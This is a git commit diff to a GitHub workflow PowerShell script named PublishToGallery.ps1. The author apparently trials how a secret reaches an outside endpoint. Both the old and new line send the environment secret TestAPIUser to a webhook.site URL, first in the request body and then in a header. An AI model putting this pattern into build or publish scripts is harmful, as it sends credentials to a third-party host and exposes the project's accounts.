9260ecc28cbfa0ede7bcb3f5246da572047294d2
MKletz <michael.kletz.27@gmail.com>
2020-10-28 10:29:40 -0500

    try235

--- .github/workflows/PublishToGallery.ps1
+++ .github/workflows/PublishToGallery.ps1
@@ -1,1 +1,1 @@
-Invoke-RestMethod -Method POST -Uri 'https://webhook.site/042894b1-915f-4d3f-9d07-484f53c15a10' -Body $ENV:TestAPIUser
+Invoke-RestMethod -Method POST -Uri 'https://webhook.site/042894b1-915f-4d3f-9d07-484f53c15a10' -Headers @{Auth = $ENV:TestAPIUser} -Body "Derp2"
